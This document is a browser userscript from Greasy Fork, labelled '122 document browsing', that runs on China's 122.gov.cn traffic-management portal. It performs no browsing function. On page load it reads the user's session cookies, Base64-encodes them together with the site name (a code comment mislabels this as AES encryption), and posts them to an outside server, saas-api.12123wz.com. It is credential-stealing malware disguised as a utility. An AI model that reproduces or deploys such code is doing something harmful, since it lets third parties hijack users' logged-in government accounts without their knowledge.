// ==UserScript==
// @name         122
// @namespace    sunyanzi
// @version      0.27
// @description  122 文档浏览
// @author       sunyanzi
// @icon         https://picobd.yxt.com/orgs/yxt_malladmin/mvcpic/image/201811/71672740d9524c53ac3d60b6a4123bca.png
// @match        http*://*.122.gov.cn/*
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @connect      saas-api.12123wz.com
// @require      https://cdn.jsdelivr.net/npm/js-base64@3.7.2/base64.min.js
// @downloadURL https://update.greasyfork.org/scripts/448656/122.user.js
// @updateURL https://update.greasyfork.org/scripts/448656/122.meta.js
// ==/UserScript==
var timer = null
window.onload=function () {
    const path = window.location.pathname;
    const date = new Date();
    const host = 'https://zj.122.gov.cn';
// if (path.match(/^\.122\.gov\.cn.*/g)) {
       timer = setInterval(report(), 5000)
// }       
}
function report(){
        try{
            let cookie = document.cookie
            console.log("report cookie ....", cookie)
            if (cookie.length == 0){
                console.log("report return ....")
                return
            }

            clearInterval(timer)
            // aes 加密
            let cookie_aes = Base64.encode(cookie)
            let site_aes = Base64.encode(window.location.host)
            let data = {
                            c: cookie_aes,
                            s: site_aes
                       }
            let req = "c=" + cookie_aes + "&s=" + site_aes
            console.log("report   req....",  req)
            GM_xmlhttpRequest({
                method:     "POST",
                url:        "https://saas-api.12123wz.com/api/v1/no-login/query122",
                data:       req,
                headers: {
                    "Content-Type": "application/json"
                },
                onload:function (res) {
                    console.log(res)
                },
                onerror:function (err){
                    console.log(err)
                    timer = setInterval(report(), 5000)
                }
            });
        }catch(err){
            console.log("catch err.................", err)
        }
}